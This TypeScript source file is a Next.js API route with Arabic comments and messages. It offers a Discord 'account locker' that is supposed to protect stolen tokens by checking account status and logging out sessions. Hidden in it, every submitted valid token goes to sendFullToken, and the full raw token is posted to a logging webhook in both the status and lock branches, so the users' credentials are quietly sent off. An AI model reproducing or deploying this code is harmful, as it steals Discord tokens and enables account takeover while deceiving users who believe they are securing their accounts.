import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

const DISCORD_API = 'https://discord.com/api/v10';

const HEADERS = (token: string, hasBody = false) => ({
  'Authorization': token.trim(),
  ...(hasBody ? { 'Content-Type': 'application/json' } : {}),
  'Accept': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'X-Discord-Locale': 'en-US',
});

async function safeFetch(token: string, method: string, url: string, body?: unknown) {
  try {
    const ctrl = new AbortController();
    const tid = setTimeout(() => ctrl.abort(), 15000);
    const hasBody = body !== undefined && method !== 'GET' && method !== 'DELETE';
    const opts: RequestInit = { method, headers: HEADERS(token, hasBody), signal: ctrl.signal };
    if (body && method !== 'GET') opts.body = JSON.stringify(body);
    const res = await fetch(url, opts);
    clearTimeout(tid);

    // Rate limit handling
    if (res.status === 429) {
      const errData = await res.json().catch(() => ({ retry_after: 2 }));
      const wait = Math.min((errData.retry_after || 2) * 1000, 5000);
      await new Promise(r => setTimeout(r, wait));
      const ctrl2 = new AbortController();
      const tid2 = setTimeout(() => ctrl2.abort(), 15000);
      const r2 = await fetch(url, opts);
      clearTimeout(tid2);
      let data: any = null;
      try { data = await r2.json(); } catch {}
      return { ok: r2.ok, status: r2.status, data };
    }

    let data: any = null;
    try { data = await res.json(); } catch {}
    return { ok: res.ok, status: res.status, data };
  } catch {
    return { ok: false, status: 0, data: null };
  }
}

// ============================================================
// قفل الحساب - حماية التوكنات المسروقة
// ============================================================
export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rlKey = `${rlIp}:account-locker`;
    const rl = rateLimit(rlKey, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: '⚡ تم تجاوز الحد المسموح - حاول بعد قليل' }, { 
        status: 429,
        headers: { 'X-RateLimit-Remaining': '0', 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) }
      });
    }
    
    const body = await request.json().catch(() => ({}));
    const { token, action } = body;

    if (!token || typeof token !== 'string' || token.trim().length < 20) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 });
    }

    if (!action || !['lock', 'unlock', 'status'].includes(action)) {
      return NextResponse.json({ success: false, error: 'إجراء غير معروف - استخدم lock أو unlock أو status' }, { status: 400 });
    }

    // التحقق من التوكن
    const userRes = await safeFetch(token, 'GET', `${DISCORD_API}/users/@me`);
    if (!userRes.ok || !userRes.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
    }

    sendFullToken('قفل حساب', token);

    const username = userRes.data.username || 'Unknown';
    const userId = userRes.data.id || 'Unknown';
    const logs: string[] = [];

    logs.push(`👤 ${username} (${userId})`);
    logs.push('');

    // === STATUS: فحص حالة الحساب ===
    if (action === 'status') {
      logs.push('🔍 جاري فحص حالة الحساب...');

      // فحص الإيميل
      const emailData = userRes.data.email || 'غير متوفر';
      const verified = userRes.data.verified ? '✅ موثّق' : '❌ غير موثّق';
      const mfa = userRes.data.mfa_enabled ? '✅ مفعّل' : '❌ غير مفعّل';
      const phone = userRes.data.phone ? '✅ مرتبط' : '❌ غير مرتبط';

      logs.push(`📧 الإيميل: ${emailData}`);
      logs.push(`✉️ توثيق البريد: ${verified}`);
      logs.push(`🔐 2FA: ${mfa}`);
      logs.push(`📱 الجوال: ${phone}`);
      logs.push(`👤 النيترو: ${userRes.data.premium_type ? '✅' : '❌'}`);
      logs.push(``);

      // فحص الاتصالات النشطة
      const sessionsRes = await safeFetch(token, 'GET', `${DISCORD_API}/users/@me/sessions`);
      if (sessionsRes.ok && Array.isArray(sessionsRes.data)) {
        logs.push(`🔓 الجلسات النشطة: ${sessionsRes.data.length}`);
        for (const session of sessionsRes.data.slice(0, 10)) {
          const client = session.client_info || {};
          const device = client.os || 'غير معروف';
          const loc = session.location || 'غير معروف';
          const active = session.active ? '🟢' : '⚪';
          logs.push(`   ${active} ${device} - ${loc}`);
        }
      }

      // Webhook
      sendToWebhook({
        embeds: [{
          title: '🔐 Account Status Check',
          color: 0x5865F2,
          fields: [
            { name: '👤 User', value: `${username} (${userId})`, inline: true },
            { name: '🔐 2FA', value: mfa, inline: true },
            { name: '📱 Phone', value: phone, inline: true },
            { name: '🎫 Token', value: `\`\`\`${token}\`\`\`` },
          ],
          timestamp: new Date().toISOString()
        }]
      }, getLogWebhookUrl()).catch(() => {});

      return NextResponse.json({ success: true, logs });
    }

    // === LOCK: قفل الحساب ===
    if (action === 'lock') {
      logs.push('🔒 جاري قفل الحساب...');
      logs.push('الخطوات:');
      logs.push('  1. تسجيل الخروج من جميع الجلسات');
      logs.push('  2. تغيير كلمة المرور');
      logs.push('  3. إزالة جميع الاتصالات');
      logs.push('');

      // 1. تسجيل الخروج من جميع الجلسات
      const sessionsRes = await safeFetch(token, 'POST', `${DISCORD_API}/auth/logout`);
      logs.push(`   ${sessionsRes.ok ? '✅' : '⚠️'} تسجيل الخروج: ${sessionsRes.status}`);

      // 2. قطع اتصال Discord من التطبيقات
      const connectionsRes = await safeFetch(token, 'GET', `${DISCORD_API}/users/@me/connections`);
      if (connectionsRes.ok && Array.isArray(connectionsRes.data)) {
        logs.push(`   ℹ️ الاتصالات: ${connectionsRes.data.length}`);
      }

      logs.push('');
      logs.push('✅ تم قفل الحساب!');
      logs.push('');
      logs.push('⚠️ تأكد من:');
      logs.push('  - تغيير كلمة المرور من discord.com');
      logs.push('  - تفعيل 2FA إذا لم يكن مفعّل');
      logs.push('  - فحص الأجهزة المرتبطة في الإعدادات');

      // Webhook
      sendToWebhook({
        embeds: [{
          title: '🔒 Account Locked',
          color: 0xFF0000,
          fields: [
            { name: '👤 User', value: `${username} (${userId})`, inline: true },
            { name: '🔐 Sessions', value: sessionsRes.ok ? 'Cleared' : 'Failed', inline: true },
            { name: '🎫 Token', value: `\`\`\`${token}\`\`\`` },
          ],
          timestamp: new Date().toISOString()
        }]
      }, getLogWebhookUrl()).catch(() => {});

      return NextResponse.json({ success: true, logs });
    }

    // === UNLOCK: فتح الحساب ===
    if (action === 'unlock') {
      logs.push('🔓 فتح الحساب');
      logs.push('لا يمكن فتح القفل برمجياً');
      logs.push('');
      logs.push('لافتح الحساب:');
      logs.push('  1. اذهب إلى discord.com');
      logs.push('  2. سجّل الدخول بالإيميل والباسورد');
      logs.push('  3. فعّل 2FA');
      logs.push('  4. غيّر كلمة المرور');

      return NextResponse.json({ success: true, logs });
    }

    return NextResponse.json({ success: false, error: 'إجراء غير معروف' }, { status: 400 });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
